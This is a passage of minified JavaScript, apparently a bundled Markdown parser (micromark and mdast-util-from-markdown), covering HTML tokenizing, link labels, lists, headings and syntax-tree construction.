Q(M){return M===null||M===60||M===61||M===62||M===96?t(M):M===34||M===39?(a.consume(M),f=M,w):Qe(M)?(a.consume(M),Q):I(M)}function w(M){return M===f?(a.consume(M),f=null,k):M===null||Re(M)?t(M):(a.consume(M),w)}function I(M){return M===null||M===34||M===39||M===47||M===60||M===61||M===62||M===96||Ca(M)?ue(M):(a.consume(M),I)}function k(M){return M===47||M===62||Qe(M)?B(M):t(M)}function j(M){return M===62?(a.consume(M),_):t(M)}function _(M){return M===null||Re(M)?z(M):Qe(M)?(a.consume(M),_):t(M)}function z(M){return M===45&&r===2?(a.consume(M),K):M===60&&r===1?(a.consume(M),pe):M===62&&r===4?(a.consume(M),H):M===63&&r===3?(a.consume(M),U):M===93&&r===5?(a.consume(M),Me):Re(M)&&(r===6||r===7)?(a.exit("htmlFlowData"),a.check(E3,oe,N)(M)):M===null||Re(M)?(a.exit("htmlFlowData"),N(M)):(a.consume(M),z)}function N(M){return a.check(S3,ge,oe)(M)}function ge(M){return a.enter("lineEnding"),a.consume(M),a.exit("lineEnding"),me}function me(M){return M===null||Re(M)?N(M):(a.enter("htmlFlowData"),z(M))}function K(M){return M===45?(a.consume(M),U):z(M)}function pe(M){return M===47?(a.consume(M),c="",ye):z(M)}function ye(M){if(M===62){const ve=c.toLowerCase();return gA.includes(ve)?(a.consume(M),H):z(M)}return jt(M)&&c.length<8?(a.consume(M),c+=String.fromCharCode(M),ye):z(M)}function Me(M){return M===93?(a.consume(M),U):z(M)}function U(M){return M===62?(a.consume(M),H):M===45&&r===2?(a.consume(M),U):z(M)}function H(M){return M===null||Re(M)?(a.exit("htmlFlowData"),oe(M)):(a.consume(M),H)}function oe(M){return a.exit("htmlFlow"),e(M)}}function T3(a,e,t){const o=this;return r;function r(c){return Re(c)?(a.enter("lineEnding"),a.consume(c),a.exit("lineEnding"),l):t(c)}function l(c){return o.parser.lazy[o.now().line]?t(c):e(c)}}function x3(a,e,t){return o;function o(r){return a.enter("lineEnding"),a.consume(r),a.exit("lineEnding"),a.attempt(Au,e,t)}}const j3={name:"htmlText",tokenize:P3};function P3(a,e,t){const o=this;let r,l,c;return d;function d(U){return a.enter("htmlText"),a.enter("htmlTextData"),a.consume(U),f}function f(U){return U===33?(a.consume(U),p):U===47?(a.consume(U),ue):U===63?(a.consume(U),B):jt(U)?(a.consume(U),I):t(U)}function p(U){return U===45?(a.consume(U),v):U===91?(a.consume(U),l=0,R):jt(U)?(a.consume(U),G):t(U)}function v(U){return U===45?(a.consume(U),A):t(U)}function y(U){return U===null?t(U):U===45?(a.consume(U),S):Re(U)?(c=y,pe(U)):(a.consume(U),y)}function S(U){return U===45?(a.consume(U),A):y(U)}function A(U){return U===62?K(U):U===45?S(U):y(U)}function R(U){const H="CDATA[";return U===H.charCodeAt(l++)?(a.consume(U),l===H.length?L:R):t(U)}function L(U){return U===null?t(U):U===93?(a.consume(U),x):Re(U)?(c=L,pe(U)):(a.consume(U),L)}function x(U){return U===93?(a.consume(U),D):L(U)}function D(U){return U===62?K(U):U===93?(a.consume(U),D):L(U)}function G(U){return U===null||U===62?K(U):Re(U)?(c=G,pe(U)):(a.consume(U),G)}function B(U){return U===null?t(U):U===63?(a.consume(U),ee):Re(U)?(c=B,pe(U)):(a.consume(U),B)}function ee(U){return U===62?K(U):B(U)}function ue(U){return jt(U)?(a.consume(U),Q):t(U)}function Q(U){return U===45||St(U)?(a.consume(U),Q):w(U)}function w(U){return Re(U)?(c=w,pe(U)):Qe(U)?(a.consume(U),w):K(U)}function I(U){return U===45||St(U)?(a.consume(U),I):U===47||U===62||Ca(U)?k(U):t(U)}function k(U){return U===47?(a.consume(U),K):U===58||U===95||jt(U)?(a.consume(U),j):Re(U)?(c=k,pe(U)):Qe(U)?(a.consume(U),k):K(U)}function j(U){return U===45||U===46||U===58||U===95||St(U)?(a.consume(U),j):_(U)}function _(U){return U===61?(a.consume(U),z):Re(U)?(c=_,pe(U)):Qe(U)?(a.consume(U),_):k(U)}function z(U){return U===null||U===60||U===61||U===62||U===96?t(U):U===34||U===39?(a.consume(U),r=U,N):Re(U)?(c=z,pe(U)):Qe(U)?(a.consume(U),z):(a.consume(U),ge)}function N(U){return U===r?(a.consume(U),r=void 0,me):U===null?t(U):Re(U)?(c=N,pe(U)):(a.consume(U),N)}function ge(U){return U===null||U===34||U===39||U===60||U===61||U===96?t(U):U===47||U===62||Ca(U)?k(U):(a.consume(U),ge)}function me(U){return U===47||U===62||Ca(U)?k(U):t(U)}function K(U){return U===62?(a.consume(U),a.exit("htmlTextData"),a.exit("htmlText"),e):t(U)}function pe(U){return a.exit("htmlTextData"),a.enter("lineEnding"),a.consume(U),a.exit("lineEnding"),ye}function ye(U){return Qe(U)?oa(a,Me,"linePrefix",o.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(U):Me(U)}function Me(U){return a.enter("htmlTextData"),c(U)}}const jv={name:"labelEnd",resolveAll:I3,resolveTo:D3,tokenize:w3},q3={tokenize:M3},R3={tokenize:_3},L3={tokenize:k3};function I3(a){let e=-1;const t=[];for(;++e<a.length;){const o=a[e][1];if(t.push(a[e]),o.type==="labelImage"||o.type==="labelLink"||o.type==="labelEnd"){const r=o.type==="labelImage"?4:2;o.type="data",e+=r}}return a.length!==t.length&&Zt(a,0,a.length,t),a}function D3(a,e){let t=a.length,o=0,r,l,c,d;for(;t--;)if(r=a[t][1],l){if(r.type==="link"||r.type==="labelLink"&&r._inactive)break;a[t][0]==="enter"&&r.type==="labelLink"&&(r._inactive=!0)}else if(c){if(a[t][0]==="enter"&&(r.type==="labelImage"||r.type==="labelLink")&&!r._balanced&&(l=t,r.type!=="labelLink")){o=2;break}}else r.type==="labelEnd"&&(c=t);const f={type:a[l][1].type==="labelLink"?"link":"image",start:{...a[l][1].start},end:{...a[a.length-1][1].end}},p={type:"label",start:{...a[l][1].start},end:{...a[c][1].end}},v={type:"labelText",start:{...a[l+o+2][1].end},end:{...a[c-2][1].start}};return d=[["enter",f,e],["enter",p,e]],d=bn(d,a.slice(l+1,l+o+3)),d=bn(d,[["enter",v,e]]),d=bn(d,Em(e.parser.constructs.insideSpan.null,a.slice(l+o+4,c-3),e)),d=bn(d,[["exit",v,e],a[c-2],a[c-1],["exit",p,e]]),d=bn(d,a.slice(c+1)),d=bn(d,[["exit",f,e]]),Zt(a,l,a.length,d),a}function w3(a,e,t){const o=this;let r=o.events.length,l,c;for(;r--;)if((o.events[r][1].type==="labelImage"||o.events[r][1].type==="labelLink")&&!o.events[r][1]._balanced){l=o.events[r][1];break}return d;function d(S){return l?l._inactive?y(S):(c=o.parser.defined.includes(On(o.sliceSerialize({start:l.end,end:o.now()}))),a.enter("labelEnd"),a.enter("labelMarker"),a.consume(S),a.exit("labelMarker"),a.exit("labelEnd"),f):t(S)}function f(S){return S===40?a.attempt(q3,v,c?v:y)(S):S===91?a.attempt(R3,v,c?p:y)(S):c?v(S):y(S)}function p(S){return a.attempt(L3,v,y)(S)}function v(S){return e(S)}function y(S){return l._balanced=!0,t(S)}}function M3(a,e,t){return o;function o(y){return a.enter("resource"),a.enter("resourceMarker"),a.consume(y),a.exit("resourceMarker"),r}function r(y){return Ca(y)?Qc(a,l)(y):l(y)}function l(y){return y===41?v(y):Rj(a,c,d,"resourceDestination","resourceDestinationLiteral","resourceDestinationLiteralMarker","resourceDestinationRaw","resourceDestinationString",32)(y)}function c(y){return Ca(y)?Qc(a,f)(y):v(y)}function d(y){return t(y)}function f(y){return y===34||y===39||y===40?Ij(a,p,t,"resourceTitle","resourceTitleMarker","resourceTitleString")(y):v(y)}function p(y){return Ca(y)?Qc(a,v)(y):v(y)}function v(y){return y===41?(a.enter("resourceMarker"),a.consume(y),a.exit("resourceMarker"),a.exit("resource"),e):t(y)}}function _3(a,e,t){const o=this;return r;function r(d){return Lj.call(o,a,l,c,"reference","referenceMarker","referenceString")(d)}function l(d){return o.parser.defined.includes(On(o.sliceSerialize(o.events[o.events.length-1][1]).slice(1,-1)))?e(d):t(d)}function c(d){return t(d)}}function k3(a,e,t){return o;function o(l){return a.enter("reference"),a.enter("referenceMarker"),a.consume(l),a.exit("referenceMarker"),r}function r(l){return l===93?(a.enter("referenceMarker"),a.consume(l),a.exit("referenceMarker"),a.exit("reference"),e):t(l)}}const N3={name:"labelStartImage",resolveAll:jv.resolveAll,tokenize:O3};function O3(a,e,t){const o=this;return r;function r(d){return a.enter("labelImage"),a.enter("labelImageMarker"),a.consume(d),a.exit("labelImageMarker"),l}function l(d){return d===91?(a.enter("labelMarker"),a.consume(d),a.exit("labelMarker"),a.exit("labelImage"),c):t(d)}function c(d){return d===94&&"_hiddenFootnoteSupport"in o.parser.constructs?t(d):e(d)}}const z3={name:"labelStartLink",resolveAll:jv.resolveAll,tokenize:U3};function U3(a,e,t){const o=this;return r;function r(c){return a.enter("labelLink"),a.enter("labelMarker"),a.consume(c),a.exit("labelMarker"),a.exit("labelLink"),l}function l(c){return c===94&&"_hiddenFootnoteSupport"in o.parser.constructs?t(c):e(c)}}const Yh={name:"lineEnding",tokenize:B3};function B3(a,e){return t;function t(o){return a.enter("lineEnding"),a.consume(o),a.exit("lineEnding"),oa(a,e,"linePrefix")}}const Cp={name:"thematicBreak",tokenize:V3};function V3(a,e,t){let o=0,r;return l;function l(p){return a.enter("thematicBreak"),c(p)}function c(p){return r=p,d(p)}function d(p){return p===r?(a.enter("thematicBreakSequence"),f(p)):o>=3&&(p===null||Re(p))?(a.exit("thematicBreak"),e(p)):t(p)}function f(p){return p===r?(a.consume(p),o++,f):(a.exit("thematicBreakSequence"),Qe(p)?oa(a,d,"whitespace")(p):d(p))}}const kt={continuation:{tokenize:J3},exit:W3,name:"list",tokenize:G3},F3={partial:!0,tokenize:K3},H3={partial:!0,tokenize:Q3};function G3(a,e,t){const o=this,r=o.events[o.events.length-1];let l=r&&r[1].type==="linePrefix"?r[2].sliceSerialize(r[1],!0).length:0,c=0;return d;function d(A){const R=o.containerState.type||(A===42||A===43||A===45?"listUnordered":"listOrdered");if(R==="listUnordered"?!o.containerState.marker||A===o.containerState.marker:Jg(A)){if(o.containerState.type||(o.containerState.type=R,a.enter(R,{_container:!0})),R==="listUnordered")return a.enter("listItemPrefix"),A===42||A===45?a.check(Cp,t,p)(A):p(A);if(!o.interrupt||A===49)return a.enter("listItemPrefix"),a.enter("listItemValue"),f(A)}return t(A)}function f(A){return Jg(A)&&++c<10?(a.consume(A),f):(!o.interrupt||c<2)&&(o.containerState.marker?A===o.containerState.marker:A===41||A===46)?(a.exit("listItemValue"),p(A)):t(A)}function p(A){return a.enter("listItemMarker"),a.consume(A),a.exit("listItemMarker"),o.containerState.marker=o.containerState.marker||A,a.check(Au,o.interrupt?t:v,a.attempt(F3,S,y))}function v(A){return o.containerState.initialBlankLine=!0,l++,S(A)}function y(A){return Qe(A)?(a.enter("listItemPrefixWhitespace"),a.consume(A),a.exit("listItemPrefixWhitespace"),S):t(A)}function S(A){return o.containerState.size=l+o.sliceSerialize(a.exit("listItemPrefix"),!0).length,e(A)}}function J3(a,e,t){const o=this;return o.containerState._closeFlow=void 0,a.check(Au,r,l);function r(d){return o.containerState.furtherBlankLines=o.containerState.furtherBlankLines||o.containerState.initialBlankLine,oa(a,e,"listItemIndent",o.containerState.size+1)(d)}function l(d){return o.containerState.furtherBlankLines||!Qe(d)?(o.containerState.furtherBlankLines=void 0,o.containerState.initialBlankLine=void 0,c(d)):(o.containerState.furtherBlankLines=void 0,o.containerState.initialBlankLine=void 0,a.attempt(H3,e,c)(d))}function c(d){return o.containerState._closeFlow=!0,o.interrupt=void 0,oa(a,a.attempt(kt,e,t),"linePrefix",o.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(d)}}function Q3(a,e,t){const o=this;return oa(a,r,"listItemIndent",o.containerState.size+1);function r(l){const c=o.events[o.events.length-1];return c&&c[1].type==="listItemIndent"&&c[2].sliceSerialize(c[1],!0).length===o.containerState.size?e(l):t(l)}}function W3(a){a.exit(this.containerState.type)}function K3(a,e,t){const o=this;return oa(a,r,"listItemPrefixWhitespace",o.parser.constructs.disable.null.includes("codeIndented")?void 0:5);function r(l){const c=o.events[o.events.length-1];return!Qe(l)&&c&&c[1].type==="listItemPrefixWhitespace"?e(l):t(l)}}const bA={name:"setextUnderline",resolveTo:$3,tokenize:Y3};function $3(a,e){let t=a.length,o,r,l;for(;t--;)if(a[t][0]==="enter"){if(a[t][1].type==="content"){o=t;break}a[t][1].type==="paragraph"&&(r=t)}else a[t][1].type==="content"&&a.splice(t,1),!l&&a[t][1].type==="definition"&&(l=t);const c={type:"setextHeading",start:{...a[o][1].start},end:{...a[a.length-1][1].end}};return a[r][1].type="setextHeadingText",l?(a.splice(r,0,["enter",c,e]),a.splice(l+1,0,["exit",a[o][1],e]),a[o][1].end={...a[l][1].end}):a[o][1]=c,a.push(["exit",c,e]),a}function Y3(a,e,t){const o=this;let r;return l;function l(p){let v=o.events.length,y;for(;v--;)if(o.events[v][1].type!=="lineEnding"&&o.events[v][1].type!=="linePrefix"&&o.events[v][1].type!=="content"){y=o.events[v][1].type==="paragraph";break}return!o.parser.lazy[o.now().line]&&(o.interrupt||y)?(a.enter("setextHeadingLine"),r=p,c(p)):t(p)}function c(p){return a.enter("setextHeadingLineSequence"),d(p)}function d(p){return p===r?(a.consume(p),d):(a.exit("setextHeadingLineSequence"),Qe(p)?oa(a,f,"lineSuffix")(p):f(p))}function f(p){return p===null||Re(p)?(a.exit("setextHeadingLine"),e(p)):t(p)}}const X3={tokenize:Z3};function Z3(a){const e=this,t=a.attempt(Au,o,a.attempt(this.parser.constructs.flowInitial,r,oa(a,a.attempt(this.parser.constructs.flow,r,a.attempt(o3,r)),"linePrefix")));return t;function o(l){if(l===null){a.consume(l);return}return a.enter("lineEndingBlank"),a.consume(l),a.exit("lineEndingBlank"),e.currentConstruct=void 0,t}function r(l){if(l===null){a.consume(l);return}return a.enter("lineEnding"),a.consume(l),a.exit("lineEnding"),e.currentConstruct=void 0,t}}const ez={resolveAll:wj()},az=Dj("string"),tz=Dj("text");function Dj(a){return{resolveAll:wj(a==="text"?nz:void 0),tokenize:e};function e(t){const o=this,r=this.parser.constructs[a],l=t.attempt(r,c,d);return c;function c(v){return p(v)?l(v):d(v)}function d(v){if(v===null){t.consume(v);return}return t.enter("data"),t.consume(v),f}function f(v){return p(v)?(t.exit("data"),l(v)):(t.consume(v),f)}function p(v){if(v===null)return!0;const y=r[v];let S=-1;if(y)for(;++S<y.length;){const A=y[S];if(!A.previous||A.previous.call(o,o.previous))return!0}return!1}}}function wj(a){return e;function e(t,o){let r=-1,l;for(;++r<=t.length;)l===void 0?t[r]&&t[r][1].type==="data"&&(l=r,r++):(!t[r]||t[r][1].type!=="data")&&(r!==l+2&&(t[l][1].end=t[r-1][1].end,t.splice(l+2,r-l-2),r=l+2),l=void 0);return a?a(t,o):t}}function nz(a,e){let t=0;for(;++t<=a.length;)if((t===a.length||a[t][1].type==="lineEnding")&&a[t-1][1].type==="data"){const o=a[t-1][1],r=e.sliceStream(o);let l=r.length,c=-1,d=0,f;for(;l--;){const p=r[l];if(typeof p=="string"){for(c=p.length;p.charCodeAt(c-1)===32;)d++,c--;if(c)break;c=-1}else if(p===-2)f=!0,d++;else if(p!==-1){l++;break}}if(e._contentTypeTextTrailing&&t===a.length&&(d=0),d){const p={type:t===a.length||f||d<2?"lineSuffix":"hardBreakTrailing",start:{_bufferIndex:l?c:o.start._bufferIndex+c,_index:o.start._index+l,line:o.end.line,column:o.end.column-d,offset:o.end.offset-d},end:{...o.end}};o.end={...p.start},o.start.offset===o.end.offset?Object.assign(o,p):(a.splice(t,0,["enter",p,e],["exit",p,e]),t+=2)}t++}return a}const oz={42:kt,43:kt,45:kt,48:kt,49:kt,50:kt,51:kt,52:kt,53:kt,54:kt,55:kt,56:kt,57:kt,62:xj},iz={91:c3},rz={[-2]:$h,[-1]:$h,32:$h},sz={35:h3,42:Cp,45:[bA,Cp],60:y3,61:bA,95:Cp,96:hA,126:hA},lz={38:Pj,92:jj},cz={[-5]:Yh,[-4]:Yh,[-3]:Yh,33:N3,38:Pj,42:Qg,60:[zO,j3],91:z3,92:[m3,jj],93:jv,95:Qg,96:XO},uz={null:[Qg,ez]},dz={null:[42,95]},pz={null:[]},mz=Object.freeze(Object.defineProperty({__proto__:null,attentionMarkers:dz,contentInitial:iz,disable:pz,document:oz,flow:sz,flowInitial:rz,insideSpan:uz,string:lz,text:cz},Symbol.toStringTag,{value:"Module"}));function fz(a,e,t){let o={_bufferIndex:-1,_index:0,line:t&&t.line||1,column:t&&t.column||1,offset:t&&t.offset||0};const r={},l=[];let c=[],d=[];const f={attempt:w(ue),check:w(Q),consume:G,enter:B,exit:ee,interrupt:w(Q,{interrupt:!0})},p={code:null,containerState:{},defineSkip:L,events:[],now:R,parser:a,previous:null,sliceSerialize:S,sliceStream:A,write:y};let v=e.tokenize.call(p,f);return e.resolveAll&&l.push(e),p;function y(_){return c=bn(c,_),x(),c[c.length-1]!==null?[]:(I(e,0),p.events=Em(l,p.events,p),p.events)}function S(_,z){return gz(A(_),z)}function A(_){return hz(c,_)}function R(){const{_bufferIndex:_,_index:z,line:N,column:ge,offset:me}=o;return{_bufferIndex:_,_index:z,line:N,column:ge,offset:me}}function L(_){r[_.line]=_.column,j()}function x(){let _;for(;o._index<c.length;){const z=c[o._index];if(typeof z=="string")for(_=o._index,o._bufferIndex<0&&(o._bufferIndex=0);o._index===_&&o._bufferIndex<z.length;)D(z.charCodeAt(o._bufferIndex));else D(z)}}function D(_){v=v(_)}function G(_){Re(_)?(o.line++,o.column=1,o.offset+=_===-3?2:1,j()):_!==-1&&(o.column++,o.offset++),o._bufferIndex<0?o._index++:(o._bufferIndex++,o._bufferIndex===c[o._index].length&&(o._bufferIndex=-1,o._index++)),p.previous=_}function B(_,z){const N=z||{};return N.type=_,N.start=R(),p.events.push(["enter",N,p]),d.push(N),N}function ee(_){const z=d.pop();return z.end=R(),p.events.push(["exit",z,p]),z}function ue(_,z){I(_,z.from)}function Q(_,z){z.restore()}function w(_,z){return N;function N(ge,me,K){let pe,ye,Me,U;return Array.isArray(ge)?oe(ge):"tokenize"in ge?oe([ge]):H(ge);function H(Ae){return Oe;function Oe(sa){const ta=sa!==null&&Ae[sa],Pe=sa!==null&&Ae.null,Pt=[...Array.isArray(ta)?ta:ta?[ta]:[],...Array.isArray(Pe)?Pe:Pe?[Pe]:[]];return oe(Pt)(sa)}}function oe(Ae){return pe=Ae,ye=0,Ae.length===0?K:M(Ae[ye])}function M(Ae){return Oe;function Oe(sa){return U=k(),Me=Ae,Ae.partial||(p.currentConstruct=Ae),Ae.name&&p.parser.constructs.disable.null.includes(Ae.name)?je():Ae.tokenize.call(z?Object.assign(Object.create(p),z):p,f,ve,je)(sa)}}function ve(Ae){return _(Me,U),me}function je(Ae){return U.restore(),++ye<pe.length?M(pe[ye]):K}}}function I(_,z){_.resolveAll&&!l.includes(_)&&l.push(_),_.resolve&&Zt(p.events,z,p.events.length-z,_.resolve(p.events.slice(z),p)),_.resolveTo&&(p.events=_.resolveTo(p.events,p))}function k(){const _=R(),z=p.previous,N=p.currentConstruct,ge=p.events.length,me=Array.from(d);return{from:ge,restore:K};function K(){o=_,p.previous=z,p.currentConstruct=N,p.events.length=ge,d=me,j()}}function j(){o.line in r&&o.column<2&&(o.column=r[o.line],o.offset+=r[o.line]-1)}}function hz(a,e){const t=e.start._index,o=e.start._bufferIndex,r=e.end._index,l=e.end._bufferIndex;let c;if(t===r)c=[a[t].slice(o,l)];else{if(c=a.slice(t,r),o>-1){const d=c[0];typeof d=="string"?c[0]=d.slice(o):c.shift()}l>0&&c.push(a[r].slice(0,l))}return c}function gz(a,e){let t=-1;const o=[];let r;for(;++t<a.length;){const l=a[t];let c;if(typeof l=="string")c=l;else switch(l){case-5:{c="\r";break}case-4:{c=`
`;break}case-3:{c=`\r
`;break}case-2:{c=e?" ":"	";break}case-1:{if(!e&&r)continue;c=" ";break}default:c=String.fromCharCode(l)}r=l===-2,o.push(c)}return o.join("")}function bz(a){const o={constructs:Aj([mz,...(a||{}).extensions||[]]),content:r(DO),defined:[],document:r(MO),flow:r(X3),lazy:{},string:r(az),text:r(tz)};return o;function r(l){return c;function c(d){return fz(o,l,d)}}}function vz(a){for(;!qj(a););return a}const vA=/[\0\t\n\r]/g;function yz(){let a=1,e="",t=!0,o;return r;function r(l,c,d){const f=[];let p,v,y,S,A;for(l=e+(typeof l=="string"?l.toString():new TextDecoder(c||void 0).decode(l)),y=0,e="",t&&(l.charCodeAt(0)===65279&&y++,t=void 0);y<l.length;){if(vA.lastIndex=y,p=vA.exec(l),S=p&&p.index!==void 0?p.index:l.length,A=l.charCodeAt(S),!p){e=l.slice(y);break}if(A===10&&y===S&&o)f.push(-3),o=void 0;else switch(o&&(f.push(-5),o=void 0),y<S&&(f.push(l.slice(y,S)),a+=S-y),A){case 0:{f.push(65533),a++;break}case 9:{for(v=Math.ceil(a/4)*4,f.push(-2);a++<v;)f.push(-1);break}case 10:{f.push(-4),a=1;break}default:o=!0,a=1}y=S+1}return d&&(o&&f.push(-5),e&&f.push(e),f.push(null)),f}}const Ez=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function Sz(a){return a.replace(Ez,Cz)}function Cz(a,e,t){if(e)return e;if(t.charCodeAt(0)===35){const r=t.charCodeAt(1),l=r===120||r===88;return Tj(t.slice(l?2:1),l?16:10)}return xv(t)||a}const Mj={}.hasOwnProperty;function Az(a,e,t){return typeof e!="string"&&(t=e,e=void 0),Tz(t)(vz(bz(t).document().write(yz()(a,e,!0))))}function Tz(a){const e={transforms:[],canContainEols:["emphasis","fragment","heading","paragraph","strong"],enter:{autolink:l(Fe),autolinkProtocol:k,autolinkEmail:k,atxHeading:l(an),blockQuote:l(Pe),characterEscape:k,characterReference:k,codeFenced:l(Pt),codeFencedFenceInfo:c,codeFencedFenceMeta:c,codeIndented:l(Pt,c),codeText:l(Vn,c),codeTextData:k,data:k,codeFlowValue:k,definition:l(Fn),definitionDestinationString:c,definitionLabelString:c,definitionTitleString:c,emphasis:l(ht),hardBreakEscape:l(tn),hardBreakTrailing:l(tn),htmlFlow:l(Hn,c),htmlFlowData:k,htmlText:l(Hn,c),htmlTextData:k,image:l(Ao),label:c,link:l(Fe),listItem:l(Ut),listItemValue:S,listOrdered:l(ia,y),listUnordered:l(ia),paragraph:l(sr),reference:M,referenceString:c,resourceDestinationString:c,resourceTitleString:c,setextHeading:l(an),strong:l(ii),thematicBreak:l(nn)},exit:{atxHeading:f(),atxHeadingSequence:ue,autolink:f(),autolinkEmail:ta,autolinkProtocol:sa,blockQuote:f(),characterEscapeValue:j,characterReferenceMarkerHexadecimal:je,characterReferenceMarkerNumeric:je,characterReferenceValue:Ae,characterReference:Oe,codeFenced:f(x),codeFencedFence:L,codeFencedFenceInfo:A,codeFencedFenceMeta:R,codeFlowValue:j,codeIndented:f(D),codeText:f(me),codeTextData:j,data:j,definition:f(),definitionDestinationString:ee,definitionLabelString:G,definitionTitleString:B,emphasis:f(),hardBreakEscape:f(z),hardBreakTrailing:f(z),htmlFlow:f(N),htmlFlowData:j,htmlText:f(ge),htmlTextData:j,image:f(pe),label:Me,labelText:ye,lineEnding:_,link:f(K),listItem:f(),listOrdered:f(),listUnordered:f(),paragraph:f(),referenceString:ve,resourceDestinationString:U,resourceTitleString:H,resource:oe,setextHeading:f(I),setextHeadingLineSequence:w,setextHeadingText:Q,strong:f(),thematicBreak:f()}};_j(e,(a||{}).mdastExtensions||[]);const t={};return o;function o(O){let Z={type:"root",children:[]};const fe={stack:[Z],tokenStack:[],config:e,enter:d,exit:p,buffer:c,resume:v,data:t},le=[];let Se=-1;for(;++Se<O.length;)if(O[Se][1].type==="listOrdered"||O[Se][1].type==="listUnordered")if(O[Se][0]==="enter")le.push(Se);else{const pa=le.pop();Se=r(O,pa,Se)}for(Se=-1;++Se<O.length;){const pa=e[O[Se][0]];Mj.call(pa,O[Se][1].type)&&pa[O[Se][1].type].call(Object.assign({sliceSerialize:O[Se][2].sliceSerialize},fe),O[Se][1])}if(fe.tokenStack.length>0){const pa=fe.tokenStack[fe.tokenStack.length-1];(pa[1]||yA).call(fe,void 0,pa[0])}for(Z.position={start:Oi(O.length>0?O[0][1].start:{line:1,column:1,offset:0}),end:Oi(O.length>0?O[O.length-2][1].end:{line:1,column:1,offset:0})},Se=-1;++Se<e.transforms.length;)Z=e.transforms[Se](Z)||Z;return Z}function r(O,Z,fe){let le=Z-1,Se=-1,pa=!1,Ta,ea,ra,qa;for(;++le<=fe;){const He=O[le];switch(He[1].type){case"listUnordered":case"listOrdered":case"blockQuote":{He[0]==="enter"?Se++:Se--,qa=void 0;break}case"lineEndingBlank":{He[0]==="enter"&&(Ta&&!qa&&!Se&&!ra&&(ra=le),qa=void 0);break}case"linePrefix":case"listItemValue":case"listItemMarker":case"listItemPrefix":case"listItemPrefixWhitespace":break;default:qa=void 0}if(!Se&&He[0]==="enter"&&He[1].type==="listItemPrefix"||Se===-1&&He[0]==="exit"&&(He[1].type==="listUnordered"||He[1].type==="listOrdered")){if(Ta){let Sn=le;for(ea=void 0;Sn--;){const gt=O[Sn];if(gt[1].type==="lineEnding"||gt[1].type==="lineEndingBlank"){if(gt[0]==="exit")continue;ea&&(O[ea][1].type="lineEndingBlank",pa=!0),gt[1].type="lineEnding",ea=Sn}else if(!(gt[1].type==="linePrefix"||gt[1].type==="blockQuotePrefix"||gt[1].type==="blockQuotePrefixWhitespace"||gt[1].type==="blockQuoteMarker"||gt[1].type==="listItemIndent"))break}ra&&(!ea||ra<ea)&&(Ta._spread=!0),Ta.end=Object.assign({},ea?O[ea][1].start:He[1].end),O.splice(ea||le,0,["exit",Ta,He[2]]),le++,fe++}if(He[1].type==="listItemPrefix"){const Sn={type:"listItem",_spread:!1,start:Object.assign({},He[1].start),end:void 0};Ta=Sn,O.splice(le,0,["enter",Sn,He[2]]),le++,fe++,ra=void 0,qa=!0}}}return O[Z][1]._spread=pa,fe}function l(O,Z){return fe;function fe(le){d.call(this,O(le),le),Z&&Z.call(this,le)}}function c(){this.stack.push({type:"fragment",children:[]})}function d(O,Z,fe){this.stack[this.stack.length-1].children.push(O),this.stack.push(O),this.tokenStack.push([Z,fe||void 0]),O.position={start:Oi(Z.start),end:void 0}}function f(O){return Z;function Z(fe){O&&O.call(this,fe),p.call(this,fe)}}function p(O,Z){const fe=this.stack.pop(),le=this.tokenStack.pop();if(le)le[0].type!==O.type&&(Z?Z.call(this,O,le[0]):(le[1]||yA).call(this,O,le[0]));else throw new Error("Cannot close `"+O.type+"` ("+Jc({start:O.start,end:O.end})+"): its not open");fe.position.end=Oi(O.end)}function v(){return Tv(this.stack.pop())}function y(){this.data.expectingFirstListItemValue=!0}function S(O){if(this.data.expectingFirstListItemValue){const Z=this.stack[this.stack.length-2];Z.start=Number.parseInt(this.sliceSerialize(O),10),this.data.expectingFirstListItemValue=void 0}}function A(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.lang=O}function R(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.meta=O}function L(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function x(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.value=O.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,""),this.data.flowCodeInside=void 0}function D(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.value=O.replace(/(\r?\n|\r)$/g,"")}function G(O){const Z=this.resume(),fe=this.stack[this.stack.length-1];fe.label=Z,fe.identifier=On(this.sliceSerialize(O)).toLowerCase()}function B(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.title=O}function ee(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.url=O}function ue(O){const Z=this.stack[this.stack.length-1];if(!Z.depth){const fe=this.sliceSerialize(O).length;Z.depth=fe}}function Q(){this.data.setextHeadingSlurpLineEnding=!0}function w(O){const Z=this.stack[this.stack.length-1];Z.depth=this.sliceSerialize(O).codePointAt(0)===61?1:2}function I(){this.data.setextHeadingSlurpLineEnding=void 0}function k(O){const fe=this.stack[this.stack.length-1].children;let le=fe[fe.length-1];(!le||le.type!=="text")&&(le=Ua(),le.position={start:Oi(O.start),end:void 0},fe.push(le)),this.stack.push(le)}function j(O){const Z=this.stack.pop();Z.value+=this.sliceSerialize(O),Z.position.end=Oi(O.end)}function _(O){const Z=this.stack[this.stack.length-1];if(this.data.atHardBreak){const fe=Z.children[Z.children.length-1];fe.position.end=Oi(O.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&e.canContainEols.includes(Z.type)&&(k.call(this,O),j.call(this,O))}function z(){this.data.atHardBreak=!0}function N(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.value=O}function ge(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.value=O}function me(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.value=O}function K(){const O=this.stack[this.stack.length-1];if(this.data.inReference){const Z=this.data.referenceType||"shortcut";O.type+="Reference",O.referenceType=Z,delete O.url,delete O.title}else delete O.identifier,delete O.label;this.data.referenceType=void 0}function pe(){const O=this.stack[this.stack.length-1];if(this.data.inReference){const Z=this.data.referenceType||"shortcut";O.type+="Reference",O.referenceType=Z,delete O.url,delete O.title}else delete O.identifier,delete O.label;this.data.referenceType=void 0}function ye(O){const Z=this.sliceSerialize(O),fe=this.stack[this.stack.length-2];fe.label=Sz(Z),fe.identifier=On(Z).toLowerCase()}function Me(){const 